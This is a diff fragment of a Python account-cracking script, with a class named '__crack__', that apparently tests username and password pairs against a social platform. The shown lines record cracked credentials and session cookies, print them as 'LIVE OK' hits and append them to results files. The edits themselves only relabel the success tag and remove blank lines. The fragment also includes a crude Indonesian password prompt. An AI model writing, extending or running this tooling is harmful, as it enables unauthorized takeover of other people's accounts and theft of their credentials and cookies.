@@ -527,18 +527,12 @@ class __crack__:
 
 # METODE SANDI MANUAL
 
-
-
     def plerr(self,id):
         self.id = id
         print(f'\n %s[%s•%s] Total ID : %s%s%s' %(N,H,N,H,len(self.id),N))
         ___yayanganteng___ = input('%s\n [%s?%s] Silakan Tekan (%sENTER%s) : %s'%(N,K,N,H,N,H))
         if ___yayanganteng___ in ('Kontol'):
             self.__pler__()
-
-            #print('\n %s[%s×%s] Sorry, it is wrong...!'%(N,M,N));self.plerr(id)
-# PROSES CRACK METODE 3 in 1
-
 
 
     def __metode__(self, cebok, user, pasw):
@@ -572,7 +566,7 @@ class __crack__:
                     elif "y" in Apk:
                         print(f'\r %sSTRV LIVE OK %s           	    \n Username : %s\n Password : %s%s'%(H,waktu,user,pw,N))
                         print(f'\r {H}Cookie   : {coki}')
-                    wrt = '[ROY-OK] %s • %s' % (user,pw)
+                    wrt = '[STRV-OK] %s • %s' % (user,pw)
                     ok.append(wrt)
                     open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                     break
@@ -603,7 +597,6 @@ class __crack__:
             loop+=1
         except requests.exceptions.ConnectionError:
             self.__metode__(cebok, user, pasw)
-
 
 
   def __pler__(self):
